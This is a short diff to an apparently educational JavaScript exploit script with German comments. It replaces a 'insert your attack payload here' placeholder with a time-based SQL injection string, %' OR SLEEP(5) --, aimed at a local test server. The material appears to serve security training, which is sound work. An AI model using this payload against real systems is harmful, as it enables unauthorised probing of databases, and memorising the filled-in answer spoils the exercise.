@@ -26,8 +26,7 @@
 const BASE_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000';
 
 async function run() {
-  // TODO: Payload bauen. Beispiel-Gerüst (Payload noch ergänzen):
-  const term = ''; // <-- HIER deinen Angriffs-Payload einsetzen
+  const term = `%' OR SLEEP(5) -- `;
 
   if (!term) {
     console.log('TODO: In dieser Datei fehlt noch der Angriffs-Payload.');
